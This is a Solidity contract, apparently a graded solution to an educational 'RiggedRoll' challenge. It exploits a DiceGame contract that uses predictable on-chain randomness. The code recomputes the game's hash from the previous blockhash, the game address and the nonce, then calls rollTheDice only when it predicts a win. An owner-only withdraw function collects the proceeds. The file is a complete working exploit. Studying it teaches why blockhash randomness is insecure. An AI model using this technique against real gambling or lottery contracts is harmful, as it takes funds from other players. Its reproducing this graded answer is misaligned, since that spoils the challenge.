pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    error RiggerRoll__LostRoll();

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function riggedRoll() public {
        if (address(this).balance < 0.002 ether) {
            revert RiggerRoll__LostRoll();
        }
        address riggedAddress = address(diceGame);
        bytes32 prevHash = blockhash(block.number - 1);
        uint256 nonce = diceGame.nonce();
        bytes32 hash = keccak256(abi.encodePacked(prevHash, riggedAddress, nonce));
        uint256 roll = uint256(hash) % 16;
        if (roll > 5) {
            revert RiggerRoll__LostRoll();
        }
        diceGame.rollTheDice{value: address(this).balance}();
    }

    function withdraw(address payable to, uint256 amount) public onlyOwner {
        to.transfer(amount);
    }

    receive() external payable {}
}
